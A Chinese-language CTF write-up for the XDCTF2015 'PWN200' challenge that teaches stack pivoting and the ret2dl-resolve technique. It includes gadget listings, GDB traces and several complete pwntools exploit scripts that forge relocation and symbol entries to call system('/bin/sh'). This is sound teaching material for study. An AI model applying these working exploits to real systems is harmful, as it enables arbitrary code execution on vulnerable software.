# PWN200

先检查一下文件

```c
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

 在 IDA中反汇编看看 程序是什么样的，这是我们发现程序存在漏洞

```cc
ssize_t vuln()
{
  char buf; // [esp+Ch] [ebp-6Ch]

  setbuf(stdin, &buf);
  return read(0, &buf, 0x100u);
}
```

这里存在着栈溢出漏洞，虽然程序存在 write 写函数 但是我要学会的是 return-to-dl-resolve 所以我们不利用write函数去泄露 

这道题首先为了让构造的 ROP 链的长度合适，这里我们可以用到栈迁移

- 首先我们要 将我们想迁移到的地址 覆盖到 程序的 ebp 上这样 执行下一个 汇编指令时 会将 这个值 赋值给 **ebp （pop ebp）**
- 然后我们要在下面调用一次 **leave ret (mov esp, ebp ; pop ebp ;)**这样我们就能将esp 也迁移过去 从而实现栈迁移 

用**ROPgadget**工具找到 我们需要的汇编指令的地址

```cc
syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'pop|ret'
Gadgets information
============================================================
0x0804861b : pop ebp ; ret
0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x08048379 : pop ebx ; ret
0x0804861a : pop edi ; pop ebp ; ret
0x08048619 : pop esi ; pop edi ; pop ebp ; ret
0x08048362 : ret
0x0804846e : ret 0xeac1

Unique gadgets found: 7
syc@ubuntu:~/Downloads/retdll$ ROPgadget --binary bof --only 'leave|ret'
Gadgets information
============================================================
0x08048458 : leave ; ret
0x08048362 : ret
0x0804846e : ret 0xeac1

Unique gadgets found: 3
syc@ubuntu:~/Downloads/retdll$ readelf -S bof | grep ".bss"
  [26] .bss              NOBITS          0804a040 001028 00000c 00  WA  0   0 32
```

找到所需要的**ROP**链的部分，如果我们将**payload**写为下面这样运行就能实现栈迁移，将**ebp**覆盖为我们想要迁移过去的值 ，然后执行**leave_ret**就能将栈迁移过去 

具体的Exploit为

```python
from pwn import *
p = process('./bof')
elf = ELF('./bof')
gdb.attach(p)

offset_ebp = 0x6c
ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x0804861b #pop ebp ; ret
leave_ret = 0x08048458 #leave ; ret
bss_addr = 0x0804a040 # readelf -S pwn1 | grep ".bss"
stack_size = 0x800
base_stage = bss_addr + stack_size


p.recvuntil('Welcome to XDCTF2015~!\n')
payload = ''
payload+= 'a'*offset_ebp
payload+= p32(base_stage)
payload+= p32(leave_ret)
p.sendline(payload)
p.interactive()
```

GDB调试环节

```cc
[DEBUG] Received 0x17 bytes:
    'Welcome to XDCTF2015~!\n'
[DEBUG] Sent 0x75 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  61 61 61 61  61 61 61 61  40 a8 04 08  │aaaa│aaaa│aaaa│@···│
    00000070  58 84 04 08  0a                                     │X···│·│
    00000075
```

发送payload后，EBP已经被覆盖为我们布置好的FakeStack地址了，也就bss段地址

```c
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 EAX  0x75
 EBX  0x0
 ECX  0xffe1207c ◂— 0x61616161 ('aaaa')
 EDX  0x100
 EDI  0xffe12160 —▸ 0xffe12180 ◂— 0x1
 ESI  0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x804a840 ◂— 0x0
 ESP  0xffe120ec —▸ 0x8048458 (deregister_tm_clones+40) ◂— leave  
 EIP  0x804851e (vuln+51) ◂— ret    
───────────────────────────────────[ DISASM ]───────────────────────────────────
   0x8048519 <vuln+46>                    add    esp, 0x10
   0x804851c <vuln+49>                    nop    
   0x804851d <vuln+50>                    leave  
 ► 0x804851e <vuln+51>                    ret             <0x8048458; deregister_tm_clones+40>
    ↓
   0x8048458 <deregister_tm_clones+40>    leave  
   0x8048459 <deregister_tm_clones+41>    ret    
 
   0x804845b <deregister_tm_clones+43>    nop    
   0x804845c <deregister_tm_clones+44>    lea    esi, [esi]
   0x8048460 <register_tm_clones>         mov    eax, 0x804a028
   0x8048465 <register_tm_clones+5>       sub    eax, 0x804a028
   0x804846a <register_tm_clones+10>      sar    eax, 2
```

 ret地址为leave ret的地址，将EBP的值交给ESP从而达到栈迁移 ，此时ESP已经bss段上

```
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 EAX  0x75
 EBX  0x0
 ECX  0xffe1207c ◂— 0x61616161 ('aaaa')
 EDX  0x100
 EDI  0xffe12160 —▸ 0xffe12180 ◂— 0x1
 ESI  0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0
 EBP  0x0
 ESP  0x804a844 ◂— 0x0
 EIP  0x8048459 (deregister_tm_clones+41) ◂— ret    
───────────────────────────────────[ DISASM ]───────────────────────────────────
   0x8048519 <vuln+46>                    add    esp, 0x10
   0x804851c <vuln+49>                    nop    
   0x804851d <vuln+50>                    leave  
   0x804851e <vuln+51>                    ret    
    ↓
   0x8048458 <deregister_tm_clones+40>    leave  
 ► 0x8048459 <deregister_tm_clones+41>    ret    <0>
```

查看一下栈的情况，已经实现了栈迁移

```cc
pwndbg> stack 30
00:0000│ esp  0x804a844 ◂— 0x0
... ↓
```

但是我们是想要让我们布置好的数据在这个**fake stack**上 

- 我们就需要先到用**read**函数向这个地方写入**ROP**链从而能实现调用。因为又**leave ret**会有一个**pop ebp**所以在布置**fake stack**的时候我首先要输入对应大小的**fake_ebp**

- 将我们要用到的**ROP**链布置到**bss**段上从而实现布置更长的**ROP**链。这样我们就知道如何去 控制我们需要的指令了

 接着我们需要做的就是通过实现**return-to-dl-resolv**实现**get shell** 

-  首先控制到PLT[0]修改我们函数的**index_offset**让其指向我们构造的**fake_reloc** 
-  控制**index_offset** 的关键是我们只需要在**PLT[0]**的下一个栈地址放上**index_offset**就行 （因为**index_offset**是在**call**函数后**Push**进栈的地址刚好在返回**PLT[0]**时的栈顶） 

我们先写一个Exploit尝试在假栈上部署一下数据

```python
from pwn import *
p = process('./bof')
elf = ELF('./bof')
gdb.attach(p)

read_plt = elf.plt['read']
write_plt = elf.plt['write']
write_got = elf.got['write']

offset = 112
ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x0804861b #pop ebp ; ret
leave_ret = 0x08048458 #leave ; ret
bss_addr = 0x0804a040 # readelf -S pwn1 | grep ".bss"
stack_size = 0x800
base_stage = bss_addr + stack_size

p.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(base_stage) 
payload += p32(read_plt)  
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)  
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage+4)
payload += p32(leave_ret)

p.sendline(payload)
cmd = "/bin/sh"
plt_0 = 0x08048380 # objdump -d -j .plt bof
index_offset = 0x20 # write's index

pause()

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(1)
payload2 += p32(base_stage + 80)
payload2 += p32(len(cmd))
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
p.sendline(payload2)
p.interactive()
```

> 这里有个坑两次payload不能发送太快，需要sleep或者pause一下，否则会当作一次输入

一直运行直到ESP被修改为假栈

```c
──────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────
 EAX  0x64
 EBX  0x0
 ECX  0x804a840 ◂— 0x41414141 ('AAAA')
 EDX  0x64
 EDI  0x804a840 ◂— 0x41414141 ('AAAA')
 ESI  0x0
 EBP  0x8048380 ◂— push   dword ptr [0x804a004]
 ESP  0x804a848 ◂— 0x20 /* ' ' */
 EIP  0x8048459 (deregister_tm_clones+41) ◂— ret    
───────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
   0x804861b <__libc_csu_init+91>         pop    ebp
   0x804861c <__libc_csu_init+92>         ret    
    ↓
   0x804861b <__libc_csu_init+91>         pop    ebp
   0x804861c <__libc_csu_init+92>         ret    
    ↓
   0x8048458 <deregister_tm_clones+40>    leave  
 ► 0x8048459 <deregister_tm_clones+41>    ret    <32>
```

 这个时候已经在fake stack上布置好了ROP链

```c
pwndbg> telescope 0x804a840
00:0000│ ecx edi  0x804a840 ◂— 0x41414141 ('AAAA')
01:0004│          0x804a844 —▸ 0x8048380 ◂— push   dword ptr [0x804a004]
02:0008│ esp      0x804a848 ◂— 0x20 /* ' ' */
03:000c│          0x804a84c ◂— 0x41414141 ('AAAA')
04:0010│          0x804a850 ◂— 0x1
05:0014│          0x804a854 —▸ 0x804a890 ◂— '/bin/sh'
06:0018│          0x804a858 ◂— 0x7
07:001c│          0x804a85c ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh'
```

接下来部署真实的ROP链，再复习一下 _dl_runtime_resolve的过程

1. 用**link_map**访问.**dynamic**，取出.**dynstr**, .**dynsym**, **.rel.plt**的指针
2. **.rel.plt + 第二个参数**求出当前函数的重定位表项**Elf32_Rel**的指针，记作**rel**
3. **rel->r_info >> 8**作为.**dynsym**的下标，求出当前函数的符号表项**Elf32_Sym**的指针，记作**sym**
4. **.dynstr + sym->st_name**得出符号名字符串指针
5. 在动态链接库查找这个函数的地址，并且把地址赋值给***rel->r_offset**，即**GOT**表
6. 调用这个函数 

**_dl_runtime_resolve**在第二步时

> **.rel.plt** + 第二个参数求出当前函数的重定位表项**Elf32_Rel**的指针，记作**rel**

这个时候，**_dl_runtime_resolve**并没有检查**.rel.plt** + 第二个参数后是否造成越界访问，所以我们能给一个很大的**.rel.plt**的**offset**（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说**.bss**

然后第三步

> **rel->r_info >> 8**作为**.dynsym**的下标，求出当前函数的符号表项**Elf32_Sym**的指针，记作**sym**

所以在我们所伪造的**Elf32_Rel**，需要放一个**r_info**字段，大概长这样就行**0xXXXXXX07**，其中**XXXXXX**是相对**.dynsym**表的下标，注意不是偏移，所以是偏移除以**Elf32_Sym**的大小，即除以**0x10**（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个**Elf32_Sym**。至于为什么是**07**，因为这是一个导入函数，而导入函数一般都是**07**，所以写成**07**就好

然后第四步

> **.dynstr + sym->st_ame**得出符号名字符串指针

![img](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg)

- 我们可以控制**index_offset**所以指向这个**fake_stack**上的一个位置即为我们布置的**fake_reloc**

  - 需要通过计算得到**index_offset** 的值， 计算公式为：我们布置的**fake_reloc** 的地址 - **rel.plt** 的真实地址

  - **fake_reloc**的结构，**r_offset**是函数 的 .**got.plt** 的地址 

    ```cc
    typedef struct
    {
      Elf32_Addr    r_offset;
      Elf32_Word    r_info;
    } Elf32_Rel;
    ```

-  让我们要做的是让**fake_reloc** 的**r_info** 指向 **fake_sym** 结构体

  - 计算方法为

    ```c
    align = 0x10-(( fake_sym_addr - .dynsym ) &7 );
    fake_sym_addr = fake_sym_addr + align ;
    index_dynsym = (fake_sym_addr - .dynsym )/0x10;
    r_info = (index_dysym<<8) | 0x7    //保证这最后一字节为 0x07
    ```

- 劫持程序到**fake_sym**之后我们要做的就是让**fake_sym**指向我们定义的 **.dynstr** 中的对应函数字符串。一般**fake_sym**我们构造的结构为**fake_sym = p32(st_name) + p32(0) + p32(0) +  p32(0x12)**  ，**st_name**就是我们保存我字符串的地址

  ```cc
  st_name = (fake_sym_addr + 0x10) - dynstr //0x10 刚好为fake_sym的大小刚好让 函数字符串 保存在这个位置。
  ```

- 让这个字符串为我们需要的如：**system** 那我们之后就能调用**write**从而调用**system** 

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720191015221035.png)

最终的Exploit

```python
from pwn import *
p = process('./bof')
elf = ELF('./bof')

read_plt = elf.plt['read']
write_plt = elf.plt['write']
write_got = elf.got['write']
offset = 112
ppp_ret = 0x08048619 #pop esi ; pop edi ; pop ebp ; ret
pop_ebp_ret = 0x0804861b #pop ebp ; ret
leave_ret = 0x08048458 #leave ; ret
bss_addr = 0x0804a040 # readelf -S pwn1 | grep ".bss"
stack_size = 0x800
base_stage = bss_addr + stack_size
plt_0 = 0x08048380 #readelf -S
rel_plt = 0x08048330
dynsym = 0x080481d8
dynstr = 0x08048278


p.recvuntil('Welcome to XDCTF2015~!\n')
payload = 'A' * offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)

p.sendline(payload)

index_offset = (base_stage + 28) - rel_plt
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
fake_dynstr = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(fake_dynstr) + p32(0) + p32(0) + p32(0x12)


payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc
payload2 += 'B' * align
payload2 += fake_sym
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += '/bin/sh\x00'
payload2 += 'A' * (100 - len(payload2))

p.sendline(payload2)
p.interactive()
```

还有一种使用ROP模块写的

```python
from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

## stack pivoting to bss segment
## new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
### padding
rop.raw('a' * offset)
### read 100 byte to base_stage
rop.read(0, base_stage, 100)
### stack pivoting, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

## write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

### making fake write symbol
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of item(Elf32_Symbol) of dynsym is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (
    fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
## plus 10 since the size of Elf32_Sym is 16.
st_name = fake_sym_addr + 0x10 - dynstr
fake_write_sym = flat([st_name, 0, 0, 0x12])

### making fake write relocation

## making base_stage+24 ---> fake reloc
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7
fake_write_reloc = flat([write_got, r_info])

rop.raw(plt0)
rop.raw(index_offset)
## fake ret addr of write
rop.raw('bbbb')
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('write\x00')  # there must be a \x00 to mark the end of string
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

